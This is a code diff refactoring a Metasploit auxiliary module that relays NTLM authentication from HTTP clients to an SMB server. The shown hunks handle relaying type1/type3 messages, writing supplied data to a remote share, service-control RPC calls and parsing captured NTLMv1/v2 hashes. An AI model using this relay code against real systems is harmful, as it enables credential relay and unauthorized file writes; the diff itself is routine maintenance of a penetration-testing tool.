@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-#   http://metasploit.com/framework/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -91,7 +89,6 @@ class Metasploit3 < Msf::Auxiliary
     when 'OPTIONS'
       process_options(cli, request)
     else
-      datastore['REQUEST_IP'] = cli.peerhost
       cli.keepalive = true;
 
       # If the host has not started auth, send 401 authenticate with only the NTLM option
@@ -237,10 +234,10 @@ class Metasploit3 < Msf::Auxiliary
       print_error("PUTDATA and FILEPUTDATA cannot both contain data")
       raise ArgumentError
     elsif datastore['PUTDATA'] != nil
-      datastore['FINALPUTDATA'] = datastore['PUTDATA']
+      @finalputdata = datastore['PUTDATA']
     elsif datastore['FILEPUTDATA'] != nil
       f = File.open(datastore['FILEPUTDATA'], "rb")
-      datastore['FINALPUTDATA'] = f.read
+      @finalputdata = f.read
       f.close
     end
 
@@ -274,7 +271,7 @@ class Metasploit3 < Msf::Auxiliary
 
     if (method == 'POST')
       theaders << 'Content-Length: ' <<
-        (datastore['FINALPUTDATA'].length + 4).to_s()<< "\r\n"
+        (@finalputdata.length + 4).to_s()<< "\r\n"
     end
 
     # HTTP_HEADERFILE is how this module supports cookies, multipart forms, etc
@@ -297,10 +294,10 @@ class Metasploit3 < Msf::Auxiliary
     'method'  => method,
     'version' => '1.1',
     }
-    if (datastore['FINALPUTDATA'] != nil)
+    if (@finalputdata != nil)
       #we need to get rid of an extra "\r\n"
       theaders = theaders[0..-3]
-      opts['data'] = datastore['FINALPUTDATA'] << "\r\n\r\n"
+      opts['data'] = @finalputdata << "\r\n\r\n"
     end
     opts['SSL'] = true if datastore["RSSL"]
     opts['raw_headers'] = theaders
@@ -326,12 +323,12 @@ class Metasploit3 < Msf::Auxiliary
   #relay ntlm type1 message for SMB
   def smb_relay_toservert1(hash)
     rsock = Rex::Socket::Tcp.create(
-      'PeerHost' 	=> datastore['RHOST'],
-      'PeerPort'	=> datastore['RPORT'],
-      'Timeout'	=> 3,
-      'Context'	=>
+      'PeerHost' => datastore['RHOST'],
+      'PeerPort' => datastore['RPORT'],
+      'Timeout'  => 3,
+      'Context'  =>
         {
-          'Msf'		=> framework,
+          'Msf'       => framework,
           'MsfExploit'=> self,
         }
     )
@@ -356,7 +353,7 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       #lazy ntlmsspblob extraction
-      ntlmsspblob =	'NTLMSSP' <<
+      ntlmsspblob = 'NTLMSSP' <<
               (resp.to_s().split('NTLMSSP')[1].split("\x00\x00Win")[0]) <<
               "\x00\x00"
     rescue ::Exception => e
@@ -369,7 +366,7 @@ class Metasploit3 < Msf::Auxiliary
 
   #relay ntlm type3 SMB message
   def smb_relay_toservert3(hash, ser_sock)
-    arg = get_hash_info(hash)
+    #arg = get_hash_info(hash)
     dhash = Rex::Text.decode_base64(hash)
 
     #Create a GSS blob for ntlmssp type 3 message, encoding the passed hash
@@ -426,7 +423,7 @@ class Metasploit3 < Msf::Auxiliary
     ser_sock.client.tree_connect(share)
 
     fd = ser_sock.open("\\#{path}", 'rwct')
-    fd << datastore['FINALPUTDATA']
+    fd << @finalputdata
     fd.close
 
     logdata = "File \\\\#{datastore['RHOST']}\\#{datastore['RURIPATH']} written"
@@ -538,7 +535,7 @@ class Metasploit3 < Msf::Auxiliary
         response = dcerpc.call(0x0c, stubdata)
         if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
             svc_handle = dcerpc.last_response.stub_data[0,20]
-            svc_status = dcerpc.last_response.stub_data[24,4]
+            #svc_status = dcerpc.last_response.stub_data[24,4]
         end
     rescue ::Exception => e
         print_error("Error: #{e}")
@@ -629,7 +626,7 @@ class Metasploit3 < Msf::Auxiliary
     nt_len = ntlm_hash.length
 
     if nt_len == 48 #lmv1/ntlmv1 or ntlm2_session
-      arg = {	:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
+      arg = { :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
         :lm_hash => lm_hash,
         :nt_hash => ntlm_hash
       }
@@ -640,11 +637,11 @@ class Metasploit3 < Msf::Auxiliary
     #if the length of the ntlm response is not 24 then it will be bigger and represent
     #a ntlmv2 response
     elsif nt_len > 48 #lmv2/ntlmv2
-      arg = {	:ntlm_ver 		=> NTLM_CONST::NTLM_V2_RESPONSE,
-        :lm_hash 		=> lm_hash[0, 32],
-        :lm_cli_challenge 	=> lm_hash[32, 16],
-        :nt_hash 		=> ntlm_hash[0, 32],
-        :nt_cli_challenge 	=> ntlm_hash[32, nt_len  - 32]
+      arg = { :ntlm_ver   => NTLM_CONST::NTLM_V2_RESPONSE,
+        :lm_hash          => lm_hash[0, 32],
+        :lm_cli_challenge => lm_hash[32, 16],
+        :nt_hash          => ntlm_hash[0, 32],
+        :nt_cli_challenge => ntlm_hash[32, nt_len  - 32]
       }
     elsif nt_len == 0
       print_status("Empty hash from #{host} captured, ignoring ... ")
